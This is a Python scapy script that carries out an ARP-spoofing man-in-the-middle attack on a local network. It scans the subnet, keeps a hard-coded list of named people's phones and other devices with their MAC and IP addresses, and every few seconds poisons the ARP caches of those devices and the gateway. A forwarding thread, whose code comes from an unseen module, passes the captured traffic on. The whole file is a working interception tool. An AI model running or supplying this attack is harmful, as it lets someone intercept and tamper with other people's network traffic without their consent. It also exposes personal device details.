from scapy.all import *
from spoofer import *
from sniffer import *
import threading
import time

conf.iface = "Intel(R) Ethernet Connection (12) I219-V"

# devices = {
#     "28:d0:43:c7:bf:6c": {"name": "Guy", "device": "Laptop", "ip" : "192.168.10.133"},
#     "72:26:6a:4f:52:1a": {"name": "Guy", "device": "iPhone", "ip" : "192.168.10.218"},
# }

devices = {
    "58:ef:68:b4:ea:49": {"name": "Home TV", "device": "TV", "ip" : "10.100.102.12"},
    "bc:9f:58:84:93:63": {"name": "Maya", "device": "iPhone", "ip" : "10.100.102.81"},
    "bc:07:1d:cc:f1:69": {"name": "Lior", "device": "Google Pixel", "ip" : "10.100.102.76"},
    "02:32:b8:8b:2c:b4": {"name": "Tali", "device": "iPhone", "ip" : "10.100.102.77"}
}

blacklisted = {
    "58:ef:68:b4:ea:49"
}

def get_all_network_devices(my_mac, gateway_mac ):
    print("Getting all network devices...")
    answered, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="10.100.102.0/24"), timeout=2, verbose=0)
    for _, received in answered:
        mac = received.hwsrc
        ip = received.psrc
        if mac == my_mac or mac == gateway_mac:
            continue
        if mac not in devices:
            devices[mac] = {"name": "Unknown", "device": mac, "ip": ip}
        else:
            devices[mac]["ip"] = ip
    for mac, info in devices.items():
        print(f"{info['ip']} -> {mac} ({info['name']})")

def main():
    gateway_ip = "10.100.102.1"
    my_mac = get_if_hwaddr(conf.iface)
    gateway_mac = get_mac(gateway_ip)

    get_all_network_devices(my_mac, gateway_mac)
    ip_to_mac = {info["ip"]: mac for mac, info in devices.items()}

    print(f"My MAC:      {my_mac}")
    print(f"Gateway MAC: {gateway_mac}")

    try:
        forwarding_thread = threading.Thread(target=start_forwarding, args=(devices, ip_to_mac, gateway_mac, my_mac, blacklisted))
        forwarding_thread.daemon = True
        forwarding_thread.start()
        while True:
            for mac, info in devices.items():
                if mac not in blacklisted:
                    spoof(info["ip"], gateway_ip, mac, my_mac)
                    spoof(gateway_ip, info["ip"], gateway_mac, my_mac)
            time.sleep(8)
    except KeyboardInterrupt:
        for mac, info in devices.items():
            restore_arp(info["ip"], mac, gateway_ip, gateway_mac)
        print("\nStopping.")

if __name__ == "__main__":
    main()
